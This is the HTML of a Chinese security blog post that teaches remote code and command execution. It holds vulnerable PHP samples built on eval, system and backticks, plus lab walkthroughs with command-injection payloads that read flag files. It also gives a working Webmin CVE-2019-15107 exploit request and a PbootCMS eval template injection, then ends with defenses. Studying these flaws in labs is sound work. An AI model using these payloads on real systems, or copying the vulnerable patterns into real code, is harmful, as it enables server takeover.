@@ -1,0 +1,446 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE漏洞 | Jasmine_Iris</title><meta name="author" content="Jasmine_Iris"><meta name="copyright" content="Jasmine_Iris"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="远程代码/命令执行漏洞（RCE）的原理、常见危险函数、利用方式与防御措施">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE漏洞">
+<meta property="og:url" content="https://jasmine-iris.top/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Jasmine_Iris">
+<meta property="og:description" content="远程代码/命令执行漏洞（RCE）的原理、常见危险函数、利用方式与防御措施">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/cover.webp">
+<meta property="article:published_time" content="2026-06-08T07:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-15T13:10:29.084Z">
+<meta property="article:author" content="Jasmine_Iris">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/cover.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RCE漏洞",
+  "url": "https://jasmine-iris.top/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/",
+  "image": "https://img.jasmine-iris.top/posts/RCE漏洞/cover.webp",
+  "datePublished": "2026-06-08T07:00:00.000Z",
+  "dateModified": "2026-08-15T13:10:29.084Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jasmine_Iris",
+      "url": "https://jasmine-iris.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/photo.png"><link rel="canonical" href="https://jasmine-iris.top/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/css/light-bg13.css"><link rel="stylesheet" href="/css/top-img.css"><link rel="preload" as="image" href="/img/miku-cinnamoroll-arrow-48.png"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://img.jasmine-iris.top/posts/RCE漏洞/cover.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">RCE漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-08T07:00:00.000Z" title="发表于 2026-06-08 15:00:00">2026-06-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-15T13:10:29.084Z" title="更新于 2026-08-15 21:10:29">2026-08-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/RCE/">RCE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image:url(https://img.jasmine-iris.top/posts/RCE漏洞/cover.webp);"></div><article class="container post-content" id="article-container"><h1 id="一、RCE简介与危害"><a href="#一、RCE简介与危害" class="headerlink" title="一、RCE简介与危害"></a>一、RCE简介与危害</h1><ul>
+<li>RCE：Remote Code/Command Execution，分为<strong>远程代码执行、远程命令执行</strong>。</li>
+<li>成因：开发使用可执行代码/系统命令的函数，函数入参用户可控且无过滤，触发漏洞。</li>
+<li>危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。</li>
+<li>案例：</li>
+</ul>
+<ol>
+<li>远程代码执行（eval函数示例）</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>测试payload：</p>
+<blockquote>
+<p><code>http://localhost/1.php?x=phpinfo();</code></p>
+<p><code>http://localhost/1.php?x=echo%20abc;</code></p>
+</blockquote>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548462485_czf38u.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548465195_dczjiw.png" loading='lazy'></p>
+<ol start="2">
+<li>远程命令执行（system函数示例）</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>测试payload</p>
+<ol>
+<li><code>http://localhost/2.php?x=ipconfig</code></li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548467012_vcu1ml.png" loading='lazy'></p>
+<ol start="2">
+<li><code>http://localhost/2.php?x=whoami</code></li>
+</ol>
+<hr>
+<h1 id="二、墨者学院靶场"><a href="#二、墨者学院靶场" class="headerlink" title="二、墨者学院靶场"></a>二、墨者学院靶场</h1><p><a target="_blank" rel="noopener" href="https://mozhe.cn/">https://mozhe.cn/</a></p>
+<h2 id="案例1：Ping命令注入"><a href="#案例1：Ping命令注入" class="headerlink" title="案例1：Ping命令注入"></a>案例1：Ping命令注入</h2><p>（靶场：<a target="_blank" rel="noopener" href="https://mozhe.cn/bug/detail/12">https://mozhe.cn/bug/detail/12</a>）</p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548469373_26l3yh.png" loading='lazy'></p>
+<ol>
+<li>页面输入<code>127.0.0.1</code>正常ping</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548472301_u5rjyl.png" loading='lazy'></p>
+<ol start="2">
+<li>确认系统</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548474388_pc0ucw.png" loading='lazy'></p>
+<ol start="3">
+<li>前端JS限制IP格式，前端过滤可绕过。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548476578_z7iola.png" loading='lazy'></p>
+<ol start="4">
+<li>Burp抓包修改POST参数：<code>iipp=127.0.0.1|ls&amp;submit=Ping</code>，<code>|</code>为命令拼接符，前命令执行完执行后续ls。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548479385_rfwyd2.png" loading='lazy'></p>
+<ol start="5">
+<li>查看返回目录：index.php、key_xxxx.php。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548481962_zwgo9p.png" loading='lazy'></p>
+<ol start="6">
+<li>最终payload：<code>iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping</code>，读取key值。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548485301_1awdsl.png" loading='lazy'></p>
+<blockquote>
+<p>注：命令分隔符有<code>|、||、&amp;、&amp;&amp;、;</code></p>
+</blockquote>
+<hr>
+<h2 id="案例2-PHP反引号命令执行"><a href="#案例2-PHP反引号命令执行" class="headerlink" title="案例2 PHP反引号命令执行"></a>案例2 PHP反引号命令执行</h2><p>（靶场：<a target="_blank" rel="noopener" href="https://mozhe.cn/bug/detail/13">https://mozhe.cn/bug/detail/13</a>）</p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548487897_qmsyk3.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548490664_ajoa9t.png" loading='lazy'></p>
+<ol>
+<li>解析代码，使⽤php</li>
+</ol>
+<p>注意： PHP 要求字符串字面量必须用单引号（<code>'</code>）或双引号（<code>"</code>）括起来  </p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">print</span>(<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">"&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;"</span>))); </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></tbody></table></figure>
+
+<p>新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。</p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548492005_v1rl2y.png" loading='lazy'></p>
+<p>PHP中<code>内容</code>反引号内内容会被当作系统shell命令执行。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[a]`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>payload1：<code>?a=ls</code> 列出当前目录，发现key文件。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548493441_xvptd4.png" loading='lazy'></p>
+<ol start="3">
+<li>payload2：<code>?a=cat&lt;key_5358811711226.php</code> 读取key内容。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548495297_2nyjgv.png" loading='lazy'></p>
+<hr>
+<h2 id="案例3-CVE-2019-15107-Webmin-RCE漏洞"><a href="#案例3-CVE-2019-15107-Webmin-RCE漏洞" class="headerlink" title="案例3 CVE-2019-15107 Webmin RCE漏洞"></a>案例3 CVE-2019-15107 Webmin RCE漏洞</h2><h3 id="1-Webmin-介绍"><a href="#1-Webmin-介绍" class="headerlink" title="(1) Webmin 介绍"></a>(1) Webmin 介绍</h3><p>Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。</p>
+<p><a target="_blank" rel="noopener" href="https://mozhe.cn/bug/detail/309">https://mozhe.cn/bug/detail/309</a></p>
+<h3 id="2-部署"><a href="#2-部署" class="headerlink" title="(2) 部署"></a>(2) 部署</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /home/enjoy/vulhub-master/webmin/CVE-2019-15107/</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose down</span><br></pre></td></tr></tbody></table></figure>
+
+<p>漏洞点：<code>password_change.cgi</code>密码重置页面参数可控，old参数可拼接系统命令。</p>
+<h3 id="3-操作"><a href="#3-操作" class="headerlink" title="(3) 操作"></a>(3) 操作</h3><p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548498529_pthidy.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548501245_ceega2.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548503245_39juja.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548505468_dr3lfv.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548507870_5d9t38.png" loading='lazy'></p>
+<ol>
+<li>登录拦截</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548509761_8thx6r.png" loading='lazy'></p>
+<ol start="2">
+<li>漏洞测试：利用数据包</li>
+</ol>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/password_change.cgi</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>182.44.114.36:46542</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>redirect=1;testing=1; sid=x; sessiontest=1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Dnt</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://182.44.114.36:46542/session_login.cgi</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>62</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"><span class="attr">user</span><span class="operator">=</span>rootxx<span class="variable">&amp;pam</span>=<span class="variable">&amp;expired</span>=<span class="number">2</span><span class="variable">&amp;old</span>=test|id<span class="variable">&amp;new1</span>=test2<span class="variable">&amp;new2</span>=test2</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Host: 靶机IP:端口	改成自己的</p>
+<p>常用 Payload</p>
+<ul>
+<li><code>old=test|id</code> 执行id查看当前用户</li>
+<li><code>old=test|ls /</code> 列出根目录文件</li>
+<li><code>old=test|cat /key.txt</code> 读取根目录key</li>
+</ul>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548511818_a38c3w.png" loading='lazy'></p>
+<ol start="3">
+<li>获取 cookie</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548513714_b2c2hn.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548515982_tlbv1b.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548518007_qm23ua.png" loading='lazy'></p>
+<hr>
+<h2 id="案例4-PbootCMS代码执行漏洞"><a href="#案例4-PbootCMS代码执行漏洞" class="headerlink" title="案例4 PbootCMS代码执行漏洞"></a>案例4 PbootCMS代码执行漏洞</h2><p>靶场下载：</p>
+<style>.gitee-file{display:flex;align-items:center;gap:14px;padding:16px 18px;margin:16px 0;  border:1px solid #e5e7eb;border-radius:12px;background:#fff;text-decoration:none!important;  transition:box-shadow .25s,transform .25s;color:inherit}.gitee-file:hover{box-shadow:0 6px 24px rgba(0,0,0,.1);transform:translateY(-2px)}.gitee-file .gf-icon{width:44px;height:44px;border-radius:8px;background:#f0f7ff;flex-shrink:0;  display:flex;align-items:center;justify-content:center;color:#5b9bd5}.gitee-file .gf-body{flex:1;min-width:0}.gitee-file .gf-name{font-weight:600;font-size:15px;color:#1f2937;line-height:1.3}.gitee-file .gf-sub{font-size:13px;color:#6b7280;margin-top:3px}.gitee-file .gf-arrow{color:#9ca3af;flex-shrink:0}[data-theme=dark] .gitee-file{background:#1e1e1e;border-color:#333}[data-theme=dark] .gitee-file .gf-name{color:#e5e7eb}[data-theme=dark] .gitee-file .gf-sub{color:#9ca3af}[data-theme=dark] .gitee-file .gf-icon{background:#2a2a2a}</style>
+<a class="gitee-file" href="https://gitee.com/jasminee0762/cyber-security/blob/master/%E9%9D%B6%E5%9C%BA/RCE/PbootCMS-1.1.4.zip" target="_blank" rel="noopener">
+  <div class="gf-icon">
+    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9l-6-6z"></path><path d="M14 3v6h6"></path></svg>
+  </div>
+  <div class="gf-body">
+    <div class="gf-name">PbootCMS-1.1.4.zip</div>
+    <div class="gf-sub">Gitee 文件 · 点击打开下载</div>
+  </div>
+  <span class="gf-arrow">
+    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"></path><path d="m7 11 5 5 5-5"></path><path d="M5 21h14"></path></svg>
+  </span>
+</a>
+
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548520627_yv5uap.png" loading='lazy'></p>
+<h3 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="(1) 漏洞分析"></a>(1) 漏洞分析</h3><p>漏洞成因：页面<code>{pboot:if(eval($_POST[1]))}</code>标签解析，POST参数1可控。</p>
+<p>审计⼯具查询危险函数：</p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548524403_7ue5zg.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548526840_g3nqjg.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548529503_5jwhzl.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548531999_4fx0xm.png" loading='lazy'></p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="2-操作"><a href="#2-操作" class="headerlink" title="(2) 操作"></a>(2) 操作</h3><ol>
+<li>在线留言</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548535134_wv52ah.png" loading='lazy'></p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AboutController ： {pboot:if(eval($_POST[1]))}!!!{/pboot:if}  </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548537406_c665kq.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548539299_fyxwet.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548541727_dodcgk.png" loading='lazy'></p>
+<ol start="2">
+<li>登录后台：admin.php</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548543134_fccghg.png" loading='lazy'></p>
+<p>账号：admin 密码：1234556</p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548545638_vre8su.png" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548548006_hkr4ph.png" loading='lazy'></p>
+<ol start="3">
+<li>访问首页：<code>http://localhost/pcms/index.php/about/10.html</code></li>
+<li>POST传参：<code>1=phpinfo();</code>，触发eval执行代码。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548550542_rvc1fp.png" loading='lazy'></p>
+<hr>
+<h1 id="三、RCE漏洞防御方案"><a href="#三、RCE漏洞防御方案" class="headerlink" title="三、RCE漏洞防御方案"></a>三、RCE漏洞防御方案</h1><ol>
+<li>危险函数入参做严格黑名单/白名单过滤，过滤<code>| &amp; ; $ &gt; &lt;</code>等命令拼接符号。</li>
+<li>尽量避免使用<code>eval、system、exec、shell_exec、``反引号</code>等高危执行函数。</li>
+<li>若业务必须使用命令执行函数，采用escapeshellarg/escapeshellcmd对输入转义过滤。<img src="https://img.jasmine-iris.top/posts/RCE%E6%BC%8F%E6%B4%9E/1786548552647_wv7dsr.png" loading='lazy'></li>
+</ol>
+<hr>
